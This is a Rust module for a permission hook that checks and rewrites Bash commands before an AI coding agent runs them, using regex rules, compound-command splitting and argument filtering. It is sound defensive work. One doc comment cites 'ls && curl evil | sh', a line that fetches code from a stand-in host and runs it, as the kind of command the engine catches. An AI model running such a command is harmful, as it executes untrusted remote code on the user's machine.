//! Bash command validation and modification rules.
//!
//! This module provides a rule engine for validating and modifying Bash tool use commands
//! before they are executed by Claude Code. Rules can deny dangerous commands, modify
//! commands to add safety flags, or explicitly allow specific patterns.

use std::collections::{BTreeSet, HashMap};

use miette::{Result, miette};
use regex::{Regex, RegexSet};
use serde::Serialize;
use tracing::debug;

use super::command_split::{AliasBinding, BailReason, LeafCommand, SplitOutcome, split_command};
use crate::{
    permission_mode::{PermissionMode, is_mode_eligible},
    user_config::{BashPathAlias, BashRule, BashRuleAction, UserConfig},
};

/// Runtime representation of a rule with pre-compiled regex for efficient matching.
///
/// Separated from `BashRule` to avoid storing `Regex` (which doesn't implement serde traits)
/// in the TOML-deserializable config struct.
#[derive(Debug)]
struct CompiledRule {
    name: String,
    regex: Regex,
    /// The post-fragment-expansion pattern source, retained so `explain` can show what actually
    /// matched (the user's pattern may contain `{{fragment}}` references).
    expanded_pattern: String,
    modes: Option<BTreeSet<PermissionMode>>,
    action: BashRuleAction,
}

/// Includes `rule_name` in all match variants to support logging and debugging.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub enum RuleResult {
    Allowed {
        rule_name: String,
    },
    Denied {
        rule_name: String,
        reason: String,
    },
    Modified {
        rule_name: String,
        new_command: String,
    },
    Asked {
        rule_name: String,
    },
    /// Command arguments should be filtered and then re-validated for security.
    ArgumentFiltered {
        rule_name: String,
        new_command: String,
        reason: Option<String>,
    },
    NoMatch,
}

/// Engine for evaluating bash command rules using RegexSet for O(1) parallel pattern matching.
///
/// Applies first-match-wins semantics: the first regex that matches determines the action.
#[derive(Debug)]
pub struct BashRuleEngine {
    regex_set: RegexSet,
    rules: Vec<CompiledRule>,
    path_aliases: BTreeSet<BashPathAlias>,
}

/// A reason a rule was dropped at compile time. Surfaced by `compile_with_diagnostics` so the
/// `rules lint` command can report rules the hook silently ignores; `from_config` logs them and
/// keeps the original fail-open-per-rule behavior on the hook hot path.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct RuleDiagnostic {
    pub rule_name: String,
    pub pattern: String,
    pub kind: RuleDiagnosticKind,
    pub message: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum RuleDiagnosticKind {
    /// A `{{fragment}}` reference had no definition.
    UndefinedFragment,
    /// Fragments referenced each other in a cycle.
    CircularFragment,
    /// Fragment expansion exceeded the maximum nesting depth.
    FragmentDepthExceeded,
    /// Fragment expansion performed too many total substitutions. Distinct from
    /// `FragmentDepthExceeded` because breadth blows up within the depth limit: a fragment
    /// referencing several others multiplies at every level of an acyclic graph.
    FragmentExpansionLimitExceeded,
    /// The expanded pattern was not a valid regex.
    InvalidRegex,
    /// A tool rule had only one of `field`/`pattern` (both are required together). Tool rules only.
    MissingFieldOrPattern,
}

impl RuleDiagnosticKind {
    pub(crate) fn label(self) -> &'static str {
        match self {
            Self::UndefinedFragment => "undefined-fragment",
            Self::CircularFragment => "circular-fragment",
            Self::FragmentDepthExceeded => "fragment-depth-exceeded",
            Self::FragmentExpansionLimitExceeded => "fragment-expansion-limit-exceeded",
            Self::InvalidRegex => "invalid-regex",
            Self::MissingFieldOrPattern => "missing-field-or-pattern",
        }
    }
}

/// Classifies an [`expand_fragments`] error from its message text. Message-matching is the only
/// signal available because `expand_fragments` returns an opaque `miette::Report`.
pub(crate) fn classify_fragment_error(message: &str) -> RuleDiagnosticKind {
    if message.contains("Circular dependency") {
        RuleDiagnosticKind::CircularFragment
    } else if message.contains("exceeded maximum depth") {
        RuleDiagnosticKind::FragmentDepthExceeded
    } else if message.contains("exceeded maximum expansion count") {
        RuleDiagnosticKind::FragmentExpansionLimitExceeded
    } else {
        // The remaining `expand_fragments` failure is the undefined-fragment case.
        RuleDiagnosticKind::UndefinedFragment
    }
}

/// Expands {{fragment_name}} references in a pattern string.
///
/// Supports nested fragments (fragments referencing other fragments) by expanding each
/// reference depth-first. Cycle detection tracks the chain of fragments currently being
/// expanded rather than every fragment ever expanded, because the same fragment legitimately
/// appears at several points in a directed acyclic graph — a pattern using both `{{safe_arg}}`
/// and `{{safe_chars}}` when `safe_arg` itself references `safe_chars` is not a cycle.
///
/// # Arguments
/// * `pattern` - The pattern string potentially containing {{fragment}} references
/// * `fragments` - Map of fragment names to their regex values
///
/// # Errors
/// * Returns error if a referenced fragment doesn't exist in the map
/// * Returns error if circular dependencies are detected (fragments referencing each other)
/// * Returns error if nested expansion exceeds MAX_DEPTH (10 levels)
/// * Returns error if total substitutions exceed MAX_EXPANSIONS (256)
///
/// # Examples
/// ```
/// # use std::collections::HashMap;
/// # use moriarty::hooks::bash_rules::expand_fragments;
/// let mut fragments = HashMap::new();
/// fragments.insert("safe".to_string(), "[^|&;$]".to_string());
/// fragments.insert("arg".to_string(), "( {{safe}}+)".to_string());
///
/// let pattern = "^ls{{arg}}*$";
/// let expanded = expand_fragments(pattern, &fragments).unwrap();
/// assert_eq!(expanded, "^ls( [^|&;$]+)*$");
/// ```
pub(crate) fn expand_fragments(
    pattern: &str,
    fragments: &HashMap<String, String>,
) -> Result<String> {
    let fragment_pattern =
        Regex::new(r"\{\{([a-zA-Z_][a-zA-Z0-9_-]*)\}\}").expect("Fragment regex pattern is valid");

    FragmentExpander {
        root_pattern: pattern,
        fragments,
        fragment_pattern: &fragment_pattern,
        active: Vec::new(),
        expansions: 0,
    }
    .expand(pattern)
}

/// Depth-first expansion state for one [`expand_fragments`] call.
struct FragmentExpander<'a> {
    /// Reported in the undefined-fragment error so it names the pattern the user wrote rather than
    /// the fragment body the dangling reference happened to sit in.
    root_pattern: &'a str,
    fragments: &'a HashMap<String, String>,
    fragment_pattern: &'a Regex,
    /// The chain of fragments whose bodies are currently being expanded, innermost last. A
    /// reference to a name already on this chain is the only true cycle; the same fragment reached
    /// by two different paths is an acyclic graph and expands normally.
    active: Vec<String>,
    /// Counted across the whole expansion rather than per branch, because it bounds the size of the
    /// result and sibling references multiply.
    expansions: usize,
}

impl FragmentExpander<'_> {
    /// Maximum nesting depth chosen to allow reasonable fragment composition
    /// (e.g., safe_chars -> safe_arg -> safe_pipe) while preventing
    /// resource exhaustion from deeply nested or circular references.
    const MAX_DEPTH: usize = 10;
    /// Depth alone does not bound the expanded pattern: a fragment referencing several others
    /// multiplies at every level, so an acyclic graph well inside [`Self::MAX_DEPTH`] can still
    /// expand into an enormous regex. Set generously so no plausible hand-written set trips it.
    const MAX_EXPANSIONS: usize = 256;

    fn expand(&mut self, text: &str) -> Result<String> {
        if self.active.len() > Self::MAX_DEPTH {
            return Err(miette!(
                "Pattern fragment expansion exceeded maximum depth of {}. \
                 This likely indicates overly deep nesting.",
                Self::MAX_DEPTH
            ));
        }

        // Copied out of `self` so the borrows below are independent of the `&mut self` the
        // recursive call needs.
        let fragments = self.fragments;
        let fragment_pattern = self.fragment_pattern;

        let mut result = String::new();
        let mut last_end = 0;

        for cap in fragment_pattern.captures_iter(text) {
            let full_match = cap.get(0).unwrap();
            let fragment_name = &cap[1];

            let fragment_value = fragments.get(fragment_name).ok_or_else(|| {
                miette!(
                    "Undefined pattern fragment '{}' referenced in pattern: {}",
                    fragment_name,
                    self.root_pattern
                )
            })?;

            if self.active.iter().any(|name| name == fragment_name) {
                return Err(miette!(
                    "Circular dependency detected in pattern fragments: '{}' references itself through other fragments",
                    fragment_name
                ));
            }

            self.expansions += 1;
            if self.expansions > Self::MAX_EXPANSIONS {
                return Err(miette!(
                    "Pattern fragment expansion exceeded maximum expansion count of {}. \
                     This likely indicates fragments that multiply across many references.",
                    Self::MAX_EXPANSIONS
                ));
            }

            result.push_str(&text[last_end..full_match.start()]);

            self.active.push(fragment_name.to_string());
            let expanded = self.expand(fragment_value);
            self.active.pop();
            result.push_str(&expanded?);

            last_end = full_match.end();
        }

        result.push_str(&text[last_end..]);
        Ok(result)
    }
}

/// Returns default pattern fragments for common security patterns.
///
/// These fragments are merged with user-defined fragments, with user
/// definitions taking precedence.
pub(crate) fn default_fragments() -> HashMap<String, String> {
    let mut fragments = HashMap::new();

    // Character classes - fundamental building blocks
    fragments.insert("safe_chars".to_string(), "[^|&;$`()<>{}]".to_string());
    fragments.insert(
        "identifier".to_string(),
        "[a-zA-Z_][a-zA-Z0-9_-]*".to_string(),
    );
    fragments.insert("number".to_string(), "[0-9]+".to_string());

    // Argument patterns - common safe argument types
    fragments.insert("safe_arg".to_string(), "( [^|&;$`()<>{}]+)".to_string());
    fragments.insert(
        "safe_flag".to_string(),
        "( -[a-zA-Z_][a-zA-Z0-9_-]*)".to_string(),
    );
    fragments.insert(
        "safe_path".to_string(),
        "( [^|&;$`()<>{}]+/[^|&;$`()<>{}]*)".to_string(),
    );

    // Pipe patterns - safe command piping
    fragments.insert(
        "safe_pipe_cmd".to_string(),
        "(head|tail|grep|wc|sort|uniq)".to_string(),
    );
    fragments.insert(
        "safe_pipe".to_string(),
        "( \\| (head|tail|grep|wc|sort|uniq)( [^|&;$`()<>{}]+)*)".to_string(),
    );

    fragments
}

/// One rule's contribution to an [`explain`](BashRuleEngine::explain) trace.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) struct RuleMatchExplanation {
    pub rule_name: String,
    /// The pattern after `{{fragment}}` expansion (what the regex engine actually compiled).
    pub expanded_pattern: String,
    pub action_summary: String,
}

/// How one leaf of a command was evaluated.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) struct SubCommandTrace {
    pub original: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub alias_expanded: Option<String>,
    pub normalized: String,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub bindings: Vec<AliasBinding>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub requires_confirmation: Option<String>,
    pub real_file_write: bool,
    pub matched: Option<RuleMatchExplanation>,
}

/// A full explanation of how [`BashRuleEngine::apply_rules_compound`] evaluates a command.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) struct CommandTrace {
    pub original: String,
    /// Bindings that were consumed as analysis metadata rather than executable leaves.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub bindings: Vec<AliasBinding>,
    /// Per-leaf evaluation in execution order; empty when `bail` is set.
    pub sub_commands: Vec<SubCommandTrace>,
    /// Set when the command could not be analyzed and fell back to whole-command evaluation.
    pub bail: Option<BailReason>,
    pub final_result: RuleResult,
}

/// A one-line, human-readable summary of a rule's action for explain output.
fn action_summary(action: &BashRuleAction) -> String {
    match action {
        BashRuleAction::Allow => "Allow".to_string(),
        BashRuleAction::Deny { value } => format!("Deny: {value}"),
        BashRuleAction::Modify { value } => format!("Modify → {value}"),
        BashRuleAction::Ask => "Ask".to_string(),
        BashRuleAction::ArgumentFilter { reason, .. } => match reason {
            Some(reason) => format!("ArgumentFilter ({reason})"),
            None => "ArgumentFilter".to_string(),
        },
    }
}

impl BashRuleEngine {
    /// Compiles rules with pattern fragment expansion, logging and skipping any rule that fails to
    /// expand or compile (fail-open per rule, preserving the hook hot path's behavior).
    pub fn from_config(config: UserConfig) -> Result<Self> {
        let (mut engine, diagnostics) = Self::compile_with_diagnostics(
            config.bash_rules.unwrap_or_default(),
            config.pattern_fragments,
        )?;
        engine.path_aliases = config.bash_path_aliases;
        for diagnostic in &diagnostics {
            tracing::error!(
                rule_name = %diagnostic.rule_name,
                pattern = %diagnostic.pattern,
                error = %diagnostic.message,
                "Skipping bash rule the hook cannot compile"
            );
        }
        Ok(engine)
    }

    /// Compiles rules, returning the engine alongside a diagnostic for every rule that was dropped.
    ///
    /// Unlike [`Self::from_config`], this does not log; the caller decides how to surface dropped
    /// rules (the hook logs them; `rules lint` reports them as errors).
    pub(crate) fn compile_with_diagnostics(
        rules: Vec<BashRule>,
        user_fragments: Option<HashMap<String, String>>,
    ) -> Result<(Self, Vec<RuleDiagnostic>)> {
        // Merge default fragments with user fragments (user takes precedence).
        let mut fragments = default_fragments();
        if let Some(user_frags) = user_fragments {
            fragments.extend(user_frags);
        }

        let mut compiled_rules = Vec::new();
        let mut patterns = Vec::new();
        let mut diagnostics = Vec::new();

        for rule in rules {
            let expanded_pattern = match expand_fragments(&rule.pattern, &fragments) {
                Ok(pattern) => pattern,
                Err(error) => {
                    let message = error.to_string();
                    diagnostics.push(RuleDiagnostic {
                        kind: classify_fragment_error(&message),
                        rule_name: rule.name,
                        pattern: rule.pattern,
                        message,
                    });
                    continue;
                }
            };

            match Regex::new(&expanded_pattern) {
                Ok(regex) => {
                    patterns.push(expanded_pattern.clone());
                    compiled_rules.push(CompiledRule {
                        name: rule.name,
                        regex,
                        expanded_pattern,
                        modes: rule.modes,
                        action: rule.action,
                    });
                }
                Err(error) => {
                    diagnostics.push(RuleDiagnostic {
                        rule_name: rule.name,
                        pattern: rule.pattern,
                        kind: RuleDiagnosticKind::InvalidRegex,
                        message: error.to_string(),
                    });
                }
            }
        }

        let regex_set = RegexSet::new(patterns)
            .map_err(|e| miette!("Failed to build RegexSet from patterns: {}", e))?;

        Ok((
            Self {
                regex_set,
                rules: compiled_rules,
                path_aliases: BTreeSet::new(),
            },
            diagnostics,
        ))
    }

    /// Index of the first mode-eligible rule (in declaration order) whose regex matches, if any.
    fn first_match_index(&self, command: &str, mode: Option<PermissionMode>) -> Option<usize> {
        self.regex_set
            .matches(command)
            .iter()
            .find(|index| is_mode_eligible(self.rules[*index].modes.as_ref(), mode))
    }

    pub fn apply_rules(&self, command: &str, mode: Option<PermissionMode>) -> RuleResult {
        if let Some(first_match_idx) = self.first_match_index(command, mode) {
            let rule = &self.rules[first_match_idx];

            debug!(
                rule_name = %rule.name,
                command = %command,
                "Bash rule matched"
            );

            return match &rule.action {
                BashRuleAction::Deny { value } => RuleResult::Denied {
                    rule_name: rule.name.clone(),
                    reason: value.clone(),
                },
                BashRuleAction::Modify { value } => {
                    let captures = rule
                        .regex
                        .captures(command)
                        .expect("Invariant violation: RegexSet and Regex desynchronized");
                    let new_command = expand_captures(&captures, value);
                    debug!(
                        rule_name = %rule.name,
                        original = %command,
                        modified = %new_command,
                        "Command modified by rule"
                    );
                    RuleResult::Modified {
                        rule_name: rule.name.clone(),
                        new_command,
                    }
                }
                BashRuleAction::Allow => {
                    debug!(rule_name = %rule.name, "Command explicitly allowed");
                    RuleResult::Allowed {
                        rule_name: rule.name.clone(),
                    }
                }
                BashRuleAction::Ask => {
                    debug!(
                        rule_name = %rule.name,
                        command = %command,
                        "Deferring to user for case-by-case authorization decision"
                    );
                    RuleResult::Asked {
                        rule_name: rule.name.clone(),
                    }
                }
                BashRuleAction::ArgumentFilter {
                    remove,
                    add,
                    replace,
                    reason,
                } => match filter_arguments(command, remove, add, replace) {
                    Ok(new_command) => {
                        debug!(
                            rule_name = %rule.name,
                            original = %command,
                            filtered = %new_command,
                            "Command arguments filtered"
                        );
                        RuleResult::ArgumentFiltered {
                            rule_name: rule.name.clone(),
                            new_command,
                            reason: reason.clone(),
                        }
                    }
                    Err(e) => {
                        debug!(
                            rule_name = %rule.name,
                            command = %command,
                            error = %e,
                            "Failed to parse command for argument filtering, asking user"
                        );
                        RuleResult::Asked {
                            rule_name: rule.name.clone(),
                        }
                    }
                },
            };
        }

        RuleResult::NoMatch
    }

    /// Evaluates a (possibly compound) command by splitting it into leaf simple-commands and
    /// applying [`Self::apply_rules`] to each independently, then merging the per-leaf decisions.
    ///
    /// This is what the hook calls. It fixes two problems with matching one regex against the whole
    /// string: a trivially-safe compound (`echo a && ls`) now matches simple allow-rules per leaf,
    /// and a dangerous tail can no longer hide behind a safe head (`ls && curl evil | sh` ⇒ Ask, not
    /// Allow). A leaf that writes to a real file is capped at Ask so a read-only allow-rule cannot
    /// green-light it. When the command cannot be analyzed, only an explicit Deny is honored; every
    /// other decision becomes a prompt. `cwd` drives in-cwd absolute-path normalization (see
    /// [`split_command`]).
    pub fn apply_rules_compound(
        &self,
        command: &str,
        cwd: &str,
        mode: Option<PermissionMode>,
    ) -> RuleResult {
        match self.split_command(command, cwd) {
            SplitOutcome::Bail(_) => downgrade_non_deny_to_ask(self.apply_rules(command, mode)),
            SplitOutcome::Commands(leaves) => merge_results(
                leaves
                    .iter()
                    .map(|leaf| self.evaluate_leaf(leaf, mode))
                    .collect(),
            ),
        }
    }

    /// Produces a full trace of how [`Self::apply_rules_compound`] evaluates `command`: the leaf
    /// split, each leaf's normalized text and matching rule, and the merged final decision. Used by
    /// `moriarty test bash-rules --explain`; the result mirrors `apply_rules_compound` exactly.
    pub(crate) fn explain(
        &self,
        command: &str,
        cwd: &str,
        mode: Option<PermissionMode>,
    ) -> CommandTrace {
        match self.split_command(command, cwd) {
            SplitOutcome::Bail(reason) => CommandTrace {
                original: command.to_string(),
                bindings: Vec::new(),
                sub_commands: Vec::new(),
                bail: Some(reason),
                final_result: downgrade_non_deny_to_ask(self.apply_rules(command, mode)),
            },
            SplitOutcome::Commands(leaves) => {
                let mut sub_commands = Vec::with_capacity(leaves.len());
                let mut results = Vec::with_capacity(leaves.len());
                let mut bindings = Vec::new();
                for leaf in &leaves {
                    for binding in &leaf.bindings {
                        if !bindings.contains(binding) {
                            bindings.push(binding.clone());
                        }
                    }
                    sub_commands.push(SubCommandTrace {
                        original: leaf.original.clone(),
                        alias_expanded: leaf.alias_expanded.clone(),
                        normalized: leaf.match_text.clone(),
                        bindings: leaf.bindings.clone(),
                        requires_confirmation: leaf.requires_confirmation.clone(),
                        real_file_write: leaf.real_file_write,
                        matched: self.match_explanation(&leaf.match_text, mode),
                    });
                    results.push(self.evaluate_leaf(leaf, mode));
                }

                CommandTrace {
                    original: command.to_string(),
                    bindings,
                    sub_commands,
                    bail: None,
                    final_result: merge_results(results),
                }
            }
        }
    }

    pub(crate) fn split_command(&self, command: &str, cwd: &str) -> SplitOutcome {
        split_command(command, cwd, &self.path_aliases)
    }

    fn evaluate_leaf(&self, leaf: &LeafCommand, mode: Option<PermissionMode>) -> RuleResult {
        let mut result = self.apply_rules(&leaf.match_text, mode);
        if leaf.real_file_write {
            result = cap_allow_at_ask(result);
        }
        if leaf.requires_confirmation.is_some() {
            result = cap_allow_at_ask(result);
        }
        result
    }

    /// The first rule matching `command`, rendered for explain output.
    fn match_explanation(
        &self,
        command: &str,
        mode: Option<PermissionMode>,
    ) -> Option<RuleMatchExplanation> {
        let rule = &self.rules[self.first_match_index(command, mode)?];
        Some(RuleMatchExplanation {
            rule_name: rule.name.clone(),
            expanded_pattern: rule.expanded_pattern.clone(),
            action_summary: action_summary(&rule.action),
        })
    }
}

/// Merges the per-leaf decisions of a compound command into a single decision.
///
/// Precedence guarantees a dangerous tail can never be hidden behind a safe head: any `Denied`
/// leaf denies the whole command; otherwise any `Asked` leaf or any `NoMatch` leaf forces a
/// prompt; only an all-`Allowed` command is allowed. A single-leaf command returns its decision
/// verbatim, so existing single-command behavior — including `Modified` / `ArgumentFiltered` and
/// the re-validation loop in `mod.rs` — is preserved exactly.
fn merge_results(results: Vec<RuleResult>) -> RuleResult {
    // Preserve today's exact single-command behavior (including the variants `mod.rs` re-validates).
    if results.len() == 1 {
        return results.into_iter().next().expect("length checked to be 1");
    }

    // Collapse every leaf in a single pass by keeping the highest-precedence decision, retaining
    // the first leaf at that precedence: a `Denied`/`Asked` keeps its originating rule, and an
    // all-`Allowed` command is attributed to the first leaf. `>=` makes earlier leaves win ties.
    let merged = results
        .into_iter()
        .fold(None, |best: Option<RuleResult>, result| match &best {
            Some(current) if merge_rank(current) >= merge_rank(&result) => best,
            _ => Some(result),
        });

    // `Denied`/`Asked`/`Allowed` are returned verbatim; everything else collapses to a prompt. A
    // `Modified` / `ArgumentFiltered` leaf cannot be safely stitched back into a rewritten compound
    // (brush `Word` is flat and `build_command` does not re-quote), so it prompts rather than
    // risking an injection-prone rewrite, exactly like a `NoMatch` leaf.
    match merged {
        Some(
            result @ (RuleResult::Denied { .. }
            | RuleResult::Asked { .. }
            | RuleResult::Allowed { .. }),
        ) => result,
        _ => RuleResult::NoMatch,
    }
}

/// Precedence rank for [`merge_results`]: a more dangerous leaf outranks a safer one, so the merged
/// decision is the strictest across the compound. `Modified` / `ArgumentFiltered` share the prompt
/// rank with `NoMatch` because they cannot be re-stitched into a safe rewrite.
fn merge_rank(result: &RuleResult) -> u8 {
    match result {
        RuleResult::Denied { .. } => 4,
        RuleResult::Asked { .. } => 3,
        RuleResult::NoMatch | RuleResult::Modified { .. } | RuleResult::ArgumentFiltered { .. } => {
            2
        }
        RuleResult::Allowed { .. } => 1,
    }
}

/// Caps an `Allowed` decision at `Asked` for a leaf that writes to a real file, so a read-only
/// allow-rule like `^echo` never silently green-lights `echo secret > real_file`.
fn cap_allow_at_ask(result: RuleResult) -> RuleResult {
    match result {
        RuleResult::Allowed { rule_name } => RuleResult::Asked { rule_name },
        other => other,
    }
}

/// For an un-analyzable (bailed) command, honor an explicit `Denied` but never let any other
/// decision auto-allow. Returning `NoMatch` makes `mod.rs` prompt the user.
fn downgrade_non_deny_to_ask(result: RuleResult) -> RuleResult {
    match result {
        denied @ RuleResult::Denied { .. } => denied,
        _ => RuleResult::NoMatch,
    }
}

/// Processes capture groups in reverse order to prevent multi-digit group numbers from being
/// partially replaced (e.g., $10 being treated as $1 followed by "0").
fn expand_captures(captures: &regex::Captures, template: &str) -> String {
    let mut result = template.to_string();

    for i in (0..captures.len()).rev() {
        if let Some(capture) = captures.get(i) {
            let placeholder = format!("${}", i);
            result = result.replace(&placeholder, capture.as_str());
        }
    }

    result
}

/// Parse a bash command into program and arguments using proper shell parsing.
///
/// Uses the `shell-words` crate to correctly handle:
/// - Quoted arguments: `"hello world"` is parsed as a single argument
/// - Escaped characters: `hello\ world` is parsed as a single argument "hello world"
/// - Shell metacharacters: Commands with unmatched quotes or invalid syntax return errors
///
/// This provides security against command injection through malformed arguments
/// that could bypass naive whitespace-based splitting.
///
/// # Returns
/// Result containing tuple of (program, args) where program is the first token
/// and args is the remaining tokens. Returns empty strings/vectors for empty commands.
///
/// # Errors
/// Returns an error if the command contains invalid shell syntax (e.g., unmatched quotes).
fn parse_command(command: &str) -> Result<(String, Vec<String>)> {
    let parts = shell_words::split(command)
        .map_err(|e| miette!("Failed to parse command as shell words: {}", e))?;

    // Empty commands return empty strings/vectors. The security model delegates to the user
    // via the Ask decision when no rules match (NoMatch result in handle_bash_pretool_hook).
    if parts.is_empty() {
        return Ok((String::new(), vec![]));
    }

    let program = parts[0].clone();
    let args = parts[1..].to_vec();

    Ok((program, args))
}

/// Reconstruct a command from program and arguments.
fn build_command(program: &str, args: &[String]) -> String {
    if args.is_empty() {
        return program.to_string();
    }

    let mut result = String::from(program);
    for arg in args {
        result.push(' ');
        result.push_str(arg);
    }
    result
}

/// Apply argument filters to a command, modifying it structurally rather than with regex.
///
/// # Design Rationale
///
/// The operation order (Remove → Replace → Add) establishes clear precedence for conflicting rules:
///
/// **Why Remove before Replace?**
/// Removal rules must take precedence over replacement rules to ensure dangerous arguments
/// are eliminated even if replacement rules target the same argument. Example:
/// - Command: `rm -f file.txt`
/// - Rules: remove `-f`, replace `-f` with `-i`
/// - Correct behavior: `-f` is removed (security wins)
/// - If replaced first: replacement could reintroduce a variant of the dangerous flag
///
/// This ordering guarantees: if an argument matches both remove and replace rules,
/// it will be removed, not transformed.
///
/// **Why Replace before Add?**
/// Security-added arguments must never be subject to user-defined transformation rules.
/// Allowing replacements to modify added arguments would violate the security guarantee
/// that certain flags will be present in the final command. Example:
/// - Command: `docker run ubuntu`
/// - Rules: replace `--read-only` with `--writable`, add `--read-only`
/// - Wrong order: security adds `--read-only`, then user replacement removes it
/// - Correct order: replacements run before add, so added flags are protected
///
/// This ordering guarantees: arguments added by security policies will appear in
/// the final command exactly as specified, without user modifications.
///
/// **Why Add last?**
/// Security flags must be appended after all user-defined transformations to ensure
/// they cannot be removed or modified by any rules, establishing them as the final
/// enforceable security boundary.
///
/// # Prefix Matching for --flag=value
///
/// The removal logic uses prefix matching for `--flag=value` syntax because:
/// - Many commands accept both `--flag value` and `--flag=value` forms
/// - Filtering `--open` should catch both `--open browser` and `--open=browser`
/// - This prevents users from bypassing filters by changing flag syntax
///
/// However, prefix matching is carefully limited:
/// - Only matches on the `=` boundary to avoid false positives
/// - `--col` won't match `--color=always` (no `=` after "col")
/// - `--open` will match `--open=browser` (exact prefix + `=`)
///
/// # Security Considerations
///
/// Uses proper shell parsing (via shell-words crate) to prevent injection attacks
/// through malformed arguments that could bypass naive whitespace-based splitting.
///
/// # Errors
/// Returns an error if the command contains invalid shell syntax.
fn filter_arguments(
    command: &str,
    remove: &Option<Vec<String>>,
    add: &Option<Vec<String>>,
    replace: &Option<HashMap<String, String>>,
) -> Result<String> {
    let (program, mut args) = parse_command(command)?;

    if let Some(remove_list) = remove {
        args.retain(|arg| {
            if remove_list.contains(arg) {
                return false;
            }

            for remove_pattern in remove_list {
                if arg.starts_with(&format!("{}=", remove_pattern)) {
                    return false;
                }
            }

            true
        });
    }

    if let Some(replace_map) = replace {
        for arg in args.iter_mut() {
            if let Some(replacement) = replace_map.get(arg) {
                *arg = replacement.clone();
            }
        }
    }

    if let Some(add_list) = add {
        args.extend(add_list.iter().cloned());
    }

    Ok(build_command(&program, &args))
}

#[cfg(test)]
#[path = "bash_rules_tests/mod.rs"]
mod tests;
